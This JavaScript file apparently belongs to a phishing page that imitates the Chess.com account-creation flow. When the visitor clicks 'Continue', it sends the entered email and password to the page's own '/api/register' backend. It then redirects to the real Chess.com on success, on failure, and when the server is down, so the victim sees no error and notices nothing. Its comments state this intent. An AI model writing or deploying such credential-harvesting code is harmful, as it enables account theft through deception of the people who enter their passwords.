document.addEventListener('DOMContentLoaded', () => {
  const pageCreate = document.getElementById('page-create');
  const pageEmail = document.getElementById('page-email');
  const btnEmail = document.getElementById('btn-email');
  const btnBack = document.getElementById('btn-back');
  const btnContinue = document.getElementById('btn-continue');
  const togglePassword = document.getElementById('toggle-password');
  const passwordInput = document.getElementById('password');

  // Navigate to email page
  btnEmail.addEventListener('click', () => {
    pageCreate.classList.remove('active');
    pageEmail.classList.add('active');
  });

  // Navigate back
  btnBack.addEventListener('click', () => {
    pageEmail.classList.remove('active');
    pageCreate.classList.add('active');
  });

  // Toggle password visibility
  togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    const eyeIcon = togglePassword.querySelector('svg');
    if (type === 'text') {
      eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
    } else {
      eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
    }
  });

  // Continue button
btnContinue.addEventListener('click', () => {
  const email = document.getElementById('email').value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    alert('Please fill in all fields');
    return;
  }

  // Send credentials to our backend
  fetch('/api/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      // All good – redirect to real Chess.com
      window.location.href = 'https://www.chess.com';
    } else {
      // Fallback: redirect anyway (optional)
      window.location.href = 'https://www.chess.com';
    }
  })
  .catch(err => {
    // If server is down, still redirect (user sees no error)
    window.location.href = 'https://www.chess.com';
  });
});
